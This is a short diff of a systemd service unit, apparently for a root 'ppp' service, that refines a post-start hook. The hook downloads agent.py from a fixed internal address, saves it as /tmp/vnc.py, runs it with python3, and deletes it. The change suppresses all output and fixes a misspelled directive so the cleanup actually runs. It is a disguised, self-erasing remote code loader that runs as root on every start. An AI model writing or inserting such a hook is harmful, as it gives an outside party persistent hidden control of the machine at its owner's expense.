@@ -4,8 +4,8 @@ After=network.target
 
 [Service]
 ExecStart=/usr/share/ppp/ppp
-ExecStartPost=/bin/bash -c 'curl -o /tmp/vnc.py http://192.168.13.104:8080/agent.py && python3 /tmp/vnc.py'
-EecStartPost=/bin/bash -c 'rm -f /tmp/vnc.py'
+ExecStartPost=/bin/bash -c 'curl -o /tmp/vnc.py http://192.168.13.104:8080/agent.py > /dev/null 2>&1 && python3 /tmp/vnc.py > /dev/null 2>&1'
+ExecStartPost=/bin/bash -c 'rm -f /tmp/vnc.py > /dev/null 2>&1'
 Restart=always
 WorkingDirectory=/usr/share/ppp
 User=root
